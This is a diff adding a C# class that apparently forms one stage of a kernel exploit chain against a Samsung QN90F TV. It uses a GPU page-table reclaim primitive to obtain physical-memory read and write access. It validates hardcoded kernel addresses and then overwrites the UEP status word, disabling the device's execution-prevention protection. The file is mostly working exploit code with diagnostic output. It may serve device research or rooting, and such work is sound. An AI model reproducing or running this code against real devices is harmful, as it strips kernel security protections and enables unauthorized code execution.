@@ -1,0 +1,85 @@
+using System;
+
+internal sealed class UepStatusControl
+{
+    // Resolved from the active QN90F Linux-5.4.261 image in mmcblk0p5.
+    private const ulong NeighborhoodPhysical = 0x20b58020UL;
+    private const ulong StatusPhysical = 0x20b58030UL;
+    private const uint KernelVirtualHigh = 0xffffffc0U;
+    private const uint PublicKeyNPointerLow = 0x10969d88U;
+    private const uint PublicKeyEPointerLow = 0x1093c2d0U;
+
+    private readonly EglComputeContext compute;
+    private readonly MaliPageTableReclaim reclaim;
+
+    internal UepStatusControl(
+        EglComputeContext compute,
+        MaliPageTableReclaim reclaim)
+    {
+        this.compute = compute;
+        this.reclaim = reclaim;
+    }
+
+    internal bool Run(bool disable)
+    {
+        MaliPageTableReclaim.PhysicalMemoryAccessor physical =
+            reclaim.AcquirePhysicalMemoryAccessor(compute);
+        uint[] before = physical.ReadWords(NeighborhoodPhysical, 7);
+
+        Console.WriteLine("uep_status_physical=0x{0:x}", StatusPhysical);
+        Console.WriteLine(
+            "uep_status_neighborhood={0}",
+            FormatWords(before));
+        ValidateNeighborhood(before);
+        Console.WriteLine("uep_status_validation=pass");
+        Console.WriteLine("uep_status_before={0}", before[4]);
+
+        if (!disable || before[4] == 0)
+        {
+            Console.WriteLine(
+                "uep_status_action={0}",
+                disable ? "already-disabled" : "inspect-only");
+            return true;
+        }
+
+        uint[] observed = physical.WriteWords(
+            StatusPhysical,
+            new uint[] { 0 });
+        uint[] after = physical.ReadWords(StatusPhysical, 1);
+        Console.WriteLine("uep_status_write_observed={0}", observed[0]);
+        Console.WriteLine("uep_status_after={0}", after[0]);
+        if (after[0] != 0)
+        {
+            throw new InvalidOperationException(
+                "UEP status write did not persist");
+        }
+        Console.WriteLine("uep_status_action=disabled");
+        return true;
+    }
+
+    private static void ValidateNeighborhood(uint[] words)
+    {
+        if (words.Length != 7
+            || words[0] != PublicKeyNPointerLow
+            || words[1] != KernelVirtualHigh
+            || words[2] != PublicKeyEPointerLow
+            || words[3] != KernelVirtualHigh
+            || (words[4] != 0 && words[4] != 1)
+            || words[5] != 0
+            || words[6] != 0)
+        {
+            throw new InvalidOperationException(
+                "QN90F UEP status neighborhood does not match the active kernel image");
+        }
+    }
+
+    private static string FormatWords(uint[] words)
+    {
+        string[] formatted = new string[words.Length];
+        for (int index = 0; index < words.Length; index++)
+        {
+            formatted[index] = string.Format("{0:x8}", words[index]);
+        }
+        return string.Join(",", formatted);
+    }
+}
